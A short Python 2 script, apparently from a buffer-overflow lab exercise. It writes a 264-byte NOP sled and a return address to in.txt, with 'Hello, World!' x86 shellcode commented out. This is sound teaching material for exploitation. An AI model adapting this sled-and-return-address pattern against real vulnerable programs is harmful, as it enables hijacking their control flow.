import sys

payload = ""

payload += "\x90" * 264
# payload += "\xeb\x1e"
# payload += "\xb8\x04\x00\x00\x00"
# payload += "\xbb\x01\x00\x00\x00"
# payload += "\x59"
# payload += "\xba\x0f\x00\x00\x00"
# payload += "\xcd\x80"
# payload += "\xb8\x01\x00\x00\x00"
# payload += "\xbb\x00\x00\x00\x00"
# payload += "\xcd\x80"
# payload += "\xe8\xdd\xff\xff\xff"
# payload += "\x48\x65\x6c\x6c\x6f\x2c\x20\x57"
# payload += "\x6f\x72\x6c\x64\x21\x0d\x0a"

print "Payload size (without addr): " + str(len(payload))

payload += "\xb9\xed\xff\xff\xff\x7f"

with open('in.txt', 'w') as outfile:
	outfile.write(payload)